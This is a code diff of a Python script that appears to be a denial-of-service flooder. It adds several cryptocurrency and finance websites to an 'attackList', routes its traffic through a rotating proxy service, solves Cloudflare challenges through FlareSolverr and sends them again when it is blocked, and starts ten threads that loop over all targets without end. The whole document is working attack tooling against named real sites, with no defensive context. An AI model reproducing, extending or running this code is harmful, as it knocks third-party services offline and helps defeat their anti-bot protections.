@@ -17,6 +17,11 @@ PROXY_URL_BASE = 'http://'+PROXY_USER+':'+PROXY_PASS+'@all.dc.smartproxy.com:POR
 
 attackList = [
 'https://coinspot.nl/fr',
+'https://actufinance.fr',
+'https://kryptoszene.de',
+'https://www.finaria.it',
+'https://tradingplatforms.com',
+'https://cryptonaute.fr',
 ]
 
 def checkIp(proxies):
@@ -85,46 +90,46 @@ def solveChanellnge(url):
 def attackUrlCF(baseUrl):	
 	cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 
-	while True:
-		try:
-			url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
+	try:
+		url = baseUrl + '/?s=' + ''.join(random.choice(letters) for i in range(10)) 
 
-			headers={'User-Agent': userAgent,
-			'Accept-Language': 'en-US,en;q=0.9',
-			'Accept-Encoding': 'gzip, deflate',
-			'Cookie': cookiesStr,
-			'Connection': 'keep-alive',
-			'Upgrade-Insecure-Requests': '1',
-			}
+		headers={'User-Agent': userAgent,
+		'Accept-Language': 'en-US,en;q=0.9',
+		'Accept-Encoding': 'gzip, deflate',
+		'Cookie': cookiesStr,
+		'Connection': 'keep-alive',
+		'Upgrade-Insecure-Requests': '1',
+		}
 
-			# checkIp()
+		# checkIp()
 
-			requestsArr = []
-			for x in range(10):
-				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
-			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
-			res = grequests.map(requestsArr, exception_handler=my_handler)
-			print(res)
-			# print(res[0].content)
-			if str(res[0].status_code) in ['503', '403', '429']:
-				print('resolsing chalennge')
-				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
-				print('resolved')
-			
-			# input()
-		except Exception as err:
-			print(err)
-			#input()
+		requestsArr = []
+		for x in range(10):
+			requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
+		#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
+		res = grequests.map(requestsArr, exception_handler=my_handler)
+		print(res)
+		# print(res[0].content)
+		if str(res[0].status_code) in ['503', '403', '429']:
+			print('resolsing chalennge')
+			cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
+			print('resolved')
+		
+		# input()
+	except Exception as err:
+		print(err)
+		#input()
 
 def attackAll():
-	for url in attackList:
-		attackUrlCF(url)
+	while True:
+		for url in attackList:
+			attackUrlCF(url)
 
 
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(10):
-	Thread(target=attackUrlCF, args=['https://coinspot.nl/fr']).start()
+	Thread(target=attackAll).start()
 	time.sleep(30)
 input()
 
